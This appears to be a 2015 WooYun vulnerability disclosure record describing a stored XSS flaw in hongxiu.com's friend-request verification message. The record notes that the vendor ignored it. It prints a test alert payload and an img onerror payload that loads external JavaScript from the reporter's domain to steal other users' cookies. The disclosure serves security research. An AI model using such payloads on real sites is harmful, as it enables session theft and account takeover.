{"id": 39265, "wybug_id": "wooyun-2015-094432", "wybug_title": "红袖添香的漏洞时代之XSS可攻击任意用户", "wybug_corp": "hongxiu.com", "wybug_author": "蛇精病", "wybug_date": "2015-01-29 11:34", "wybug_open_date": "2015-02-03 11:36", "wybug_type": "xss跨站脚本攻击", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["存储型"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-01-29：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-02-03：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述：  这几天看裸婚时代，发现一个问题——你连棒棒糖都没有，还跟我谈什么狗屁爱情~裸婚时代原来就是红袖添香出品的小说，今天我们一起来走进红袖添香的漏洞时代 详细说明：  红袖添香某处存在存储型XSS，可以攻击任意用户，取得cookie，红袖的用户量很大我看百科是在240W以上，那是以前的统计，现在估计怎么也得500W+了吧？   漏洞证明：  1、为什么是任意用户都可以攻击呢？ 我们看下图，每个用户的用户名都完整的显示，可以用来查找好友\n\n2、我注册了两个号，用账号1查找账号2\n\n3、需要验证信息，这里我们先弹个窗看看\n<img src=x onerror=alert(\"Snake\");>\n\n\n4、我们去小号看看能不能弹\n\n我们发现已经弹窗了5、然后我尝试用xssan平台直接提供的img标签x入获取cookie的代码发现不好用，后来我就调用了一个外部的JS，代码如下\n<img src=x onerror=s=createElement('script');body.appendChild(s);s.src='http://www.aluo521.com/2.js';>\nsrc里面就是我的外部js5、然后我们依照上面的步骤，发送加好友请求，然后看看XSS平台收到信没有\n\nOK成功收到cookie~~   修复方案：  过滤   版权声明：转载请注明来源 蛇精病@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2015-02-03 11:36 厂商回复：  最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}